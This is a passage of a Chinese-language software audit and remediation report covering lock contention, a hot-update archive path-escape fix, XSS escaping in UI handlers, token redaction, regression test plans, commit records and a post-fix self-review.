- **C4 · 流式落盘 fsync 在全局锁内（`app/core/store.py:2687`）**：`stream_step` 拿到全局 `LOCK` 后调用 `_save_json`（`atomic.write_json`，含 fsync），节流下限 0.6 s。多任务并行时这把全局锁被高频短写反复占用，`update_run`/`add_step` 等关键路径排队；磁盘慢（机械盘/杀软扫描）时单次 fsync 可达数十毫秒。建议流式态写独立小文件（`run.json.stream`）或放宽节流。**已量化并落地 `c7fb114`**：0.28/1.55/4.65 MB → 4.7/11.9/32.3 ms（峰值 51 ms），实测 fsync 只占 ~1 ms、真正的成本是全量重写，故改为 1.2 s 节流 + 预览态非 durable（仍原子写），未采用独立文件方案（要改读侧，收益不抵风险）。

### 可维护性

- **C5 · `_run_serial_review` 2353 行（`app/core/pipeline.py:3395-5747`）**：函数内含 `crit_prompt_for`、`_signing_eval`、章节循环、`run_global_round` 与全局评审/收尾等阶段，局部闭包共享状态，`pipeline_review.py` 又通过 `_pl()` 反向读 `pipeline` 内部，拆分必须先解耦状态再动刀。建议按 4 段推进（准备 / 逐章评审 / 重评 / 收尾），每段单独提交并跑同一组 fixture 回归；不建议一次性大 patch。**仍未实施（第二轮复核后维持）**：拆分必须先解耦闭包状态与 `_pl()` 反向依赖，属独立重构，不适合夹在修复批次里做。

### 零依赖纪律

- **D1 · `esc`/`jsq` 无约束共存（`app/ui/app.js:1700、1789`）**：两者命名不表达用途差异（HTML 文本 vs JS 字符串），B1 就是误用产物。建议改名（`html()` / `jsArg()`）或加静态检查（见 B1 验证第 2 条），不改调用协议。
- 本轮未确认其他死代码/未使用导入；`app/core/cli_discovery.py` 的 `DEFAULT_CLIS` 仍是 catalog 失败兜底，属活代码，不列 P3。

## 4. 零依赖纪律检查

- 本轮**未引入任何依赖**，也未尝试引入：A1 的摘要校验用 `node:crypto`（Node 内置），解包校验用 Python `tarfile`/`pathlib`（标准库）；B1/B3/B4/B5 全部落在既有模块内。
- 未新增 npm 包、未新增 `requirements`。A1 的 `fetchIntegrity` 用 `https` 直连 registry 的 packument，与既有 `downloadTo` 同一信任边界（host 白名单 + 仅 https），未扩大攻击面。

## 5. 回归风险清单

| 改动 | 触碰的对外行为面 | 回归测试点 |
|---|---|---|
| A1 | 桌面热更新通信（下载/校验语义）；无 API 形状变化 | `tests/desktop_hotupdate_harness.cjs` 增 3 例；手工更新一次真包 |
| A2 | 桌面启动自愈路径 | 跨卷更新 + 中断注入；启动能回滚 |
| B1 | Web UI DOM 渲染（无路由变化） | 新增内联处理器转义静态测试 + 模型名含 `'` 的手工用例 |
| B2 | 启动输出文本（非 API）；`/api/connect` 不变 | `grep -rn "token=" tests/*.py` 同步；桌面日志不含 token |
| B3 | 评审者选择结果（手动模式） | `test_reviewer_isolation` + 新增手动模式用例；`test_review_cli_fallback` |
| B4 | 解析器返回值（`usage` 数字语义不变） | `test_cli_parsers` + 新增类型漂移用例 |
| B5 | ACP 会话收尾时序（命令被提前取消） | 新增 `test_acp_terminal_lifecycle`；`tests/test_acp_*.py` 全跑 |
| C1/C2/C4 | 换将顺序 / 探测时机 / 落盘频率 | 各自定向单测 + 一次真实任务观察；C1 需产品确认 |

统一回归入口：`python scripts/run_protected_suite.py`（隔离数据目录，不触碰 `8765`）。

## 6. 结论变更（相对同日早前的审查记录）

- **「CLI 诊断默认只列 5 个 CLI」已失效**：`cli_discovery.default_specs()`（`:125`）已按 catalog 全集生成，并行提交 `eb389f5` 修复，不再列为缺陷。
- **「`VENDOR_ERROR` 不在换将白名单」已失效**：现白名单含 `VENDOR_ERROR`，与本轮 `router.py` 复核一致，撤回原判断。
- **`main.py` token 输出的定级由 P0 调整为 P1**：本地控制台输出本身不构成越权，真正的问题是桌面端把 stdout 落进持久日志（`backend.cjs:150-155`）后才形成可外传凭据；证据链见 B2，定级按「需要用户上传日志或同步盘」的实际触发条件收敛。
- **`A1` 由 P1 上调为 P0**：上一轮只提到「未校验摘要」，本轮补齐了「成员路径不受限 + 校验发生在解包之后」两条，构成可越界写文件的实际链路。

## 7. 建议落地顺序（每个 diff 一个逻辑变更）

1. A1（P0，安全）→ 独立提交，附 harness 三例。
2. B2（P1，凭据）→ 独立提交，改启动输出 + 同步测试。
3. B1（P1，XSS）→ 单独提交（机械替换 + 静态检查），避免与其它 UI 改动混在一起。
4. B3 / B4（P1，编排与适配）→ 各一提交，附定向单测。
5. B5 / A2（P1，生命周期）→ 各一提交。
6. C1–C5（P2）→ 先量化/先确认（C1 换将顺序、C4 落盘频率需产品判断），再逐个提交。

## 8. 落地记录（2026-10-23 18:10）

P0/P1 与可验证的 P2 已落地，一提交一逻辑变更。第一批 7 项后全量回归
`run_protected_suite.py` → 1432 tests, OK (skipped=5)，151s；第二批（C1–C4）
完成后 **1489 tests, OK (skipped=5)**，185s；第三轮自检补两条修复后
**1498 tests, OK (skipped=5)**，240s（差额来自并行会话新增用例）。

| 条目 | 提交 | 关键改动 | 新增回归 |
|---|---|---|---|
| A1 | `e1fe145` | `fetchIntegrity` + `fileIntegrity` + 成员白名单解包 | harness 8 例（含越界/符号链接样本） |
| A2 | `a84a891` | `installAppTree` 跨卷临时目录 + 原子改名；启动清残留 | harness 3 例（模拟 EXDEV/复制失败） |
| B2 | `114ea7a` | `access_url()` 默认打码 + `--print-token` 出口 | `test_startup_token_redaction` 6 项 |
| B1 | `3a57267` `9213d09` | 181 处内联处理器参数 `esc` → `jsq`；jsq 补换行/行分隔符 | `test_ui_inline_handler_escaping` 4 项（含真跑 jsq） |
| B3 | `aa959dc` | 手动模式统一 `pick_reviewer`；删 `_pick_reviewer_legacy` | `test_reviewer_mode_parity` 3 项 |
| B4 | `857233f` | `_obj`/`_int_or_zero`/`_float_or_zero` | `test_cli_parser_type_drift` 8 项 |
| B5 | `3d13e7d` `c8ec7ec` | `_stop_pending_terminals` + finally 收尾；`_run_terminal_command` 异常也置 done | `test_acp_terminal_lifecycle` 6 项 |
| C3 | `201a9b2` | `SSE_MAX_CONNECTIONS`（默认 32）+ 超限 503 + `Retry-After`；槽位在 finally 归还 | `test_sse_connection_cap` 4 项 |
| C4 | `c7fb114` | 节流 0.6s → 1.2s；预览态非 durable（仍原子写） | `test_stream_persist_budget` 3 项 |
| C1 | `a183971` | `_switch_identity`/`_ranked_candidates`/`_prefer_disjoint_candidate`：瞬态失败优先异上游异族，仅重排不扩池 | `test_switch_isolation` 7 项 |
| C2 | `463a28b` | `find_git_bash` 正结果永久、负结果 60s TTL | `test_git_bash_probe_cache` 4 项 |
| 文档 | `dc88905` / `a1afc48` | CHANGELOG「未发布」六条 + 四条 | — |

**C4 量化（先测量再改，NVMe SSD，`run.json` 全量重写耗时）**：

| run.json | 中位 | 峰值 |
|---|---|---|
| 0.28 MB | 4.7 ms | 5.6 ms |
| 1.55 MB | 11.9 ms | 14.5 ms |
| 4.65 MB | 32.3 ms | 51.3 ms |

长跑（120 步 × 每步 20KB 思考+正文）就在 4.65MB 量级 ⇒ 0.6s 节流意味着全局
`LOCK` 约 5% 的时间被流式预览占着。磁盘慢（机械盘/杀软扫描）时 fsync 的尾延迟
会更差，所以预览态连带取消 fsync；最终值仍由 `finish_step` 全量 durable 落盘。

**C1 的行为边界（写给产品确认用）**：只在「允许换将、且没有 dead/blocked
台账」时介入；只在调用方给的候选池内重排，不新增候选、不改 `exclude`；死者
身份（上游/族）取不到时原样返回；隔离候选耗尽时保持原选择且不改 `reason`
（只记 WARNING）——单一网关是常见部署，不该把每条换将说明刷成噪音。

**未落地**：C5（`_run_serial_review` 2353 行拆分）。理由不变且经复核加强：内部
闭包共享状态、`pipeline_review.py` 反向读 `pipeline` 内部；复核时逐块看过纯函数
候选——`means_of`/`review_stats` 只是转调 `quality_gate` 的 10 行薄包装，`dims`
来自外层，拆出去既不改变复杂度也不减少耦合，剩下几块（`crit_prompt_for`、
`_signing_eval`、章节循环）都直接读写外层可变状态。拆分必须先解耦状态，属独立
重构，无法在「不改行为」前提下顺手做。
D1（`esc`/`jsq` 命名约束）不改名的决定见 §9。

## 9. 修复后自检（2026-10-23 18:50，第三轮）

对自己的 12 个补丁做对抗性复核：查「新代码有没有引入新问题 / 老结论是否被
实测推翻」。两条假设被证伪、两条是真缺陷（已修）。

**证伪的两条（不改代码）**

| 怀疑 | 实测 | 结论 |
|---|---|---|
| `EXTRACT_SCRIPT` 会把真实 npm 的 `package/` 目录项判成不安全路径，热更必然失败 | 造含 `package/` 的 tarball 跑真实脚本：exit 0。Python `tarfile` 读回目录成员时会剥掉尾斜杠（实测 name = `'package'`，parts = `['package']`） | 不存在该缺陷；先看 tarfile 行为再下结论，别照着我写的字符串推演 |
| fsync 是流式落盘的主要成本 | 全量重写 4.65MB → 32ms，fsync 仅 ~1ms | C4 的改法（放宽节流 + 预览非 durable）方向正确，但收益主要来自节流而非 fsync，已在 §3/C4 修正表述 |

另核过并确认无问题：`installAppTree` 调用前 `appDir` 已被 rename 成 backup
（不存在 ENOTEMPTY 风险）；`_sse_acquire/release` 在 503 与异常路径平衡；
`access_url` 四处输出已全量覆盖；`_prefer_disjoint_candidate` 的边界分支
（无身份/首选本就异族/候选耗尽）与既有换将 reason 不叠加。

**新发现并修复的两条**

| 提交 | 缺陷 | 触发条件 | 症状 |
|---|---|---|---|
| `c8ec7ec` | `_run_terminal` 裸闭包，异常时 `done` 永不置位 | `_exec_tool` 抛异常（工具被裁定拒绝后仍抛、审计写失败等） | `terminal/wait_for_exit` 只能靠 cancel/deadline 退出 ⇒ agent 在一条已炸掉的命令上空转到任务时限；收尾时仍算「未收手」 |
| `9213d09` | `jsq` 不转义换行 / `\r` / U+2028 / U+2029 | 上游 `/v1/models` 模型名（或文件名）含换行 | 硬行终止符让整个 `onclick` 变语法错误 ⇒ 按钮点了没反应，控制台只有 `Invalid or unexpected token`，排查时看不出是上游数据 |

`c8ec7ec` 同时把闭包提成模块级 `_run_terminal_command(..., exec_tool=None)`，
让这两条路径可直接单测；`9213d09` 的测试改为「抽出 jsq 真跑 + 模拟浏览器解码
属性和编译 JS 两步」，已做变异验证（删掉换行转义即红）。

**D1 不改名的理由**：全量重命名 `esc`→`htmlEsc`、`jsq`→`jsEsc` 要动 1587 处调用点
（app.js 1526 + activity.js 9 + project-overview.js 34 + board.js 17 + mobile-workbench.js 1，
其中 activity/project-overview/mobile-workbench 依赖 app.js 的全局 `esc`），另有 4 个
测试文件里硬编码的 `esc(...)` 断言字面量，且并行会话正在改测试文件。纯改名的
超大 diff 会让 review 更难、冲突更多，而它要防的误用已由
`test_ui_inline_handler_escaping`（静态形态 + 行为验证）兜住：误用即红。

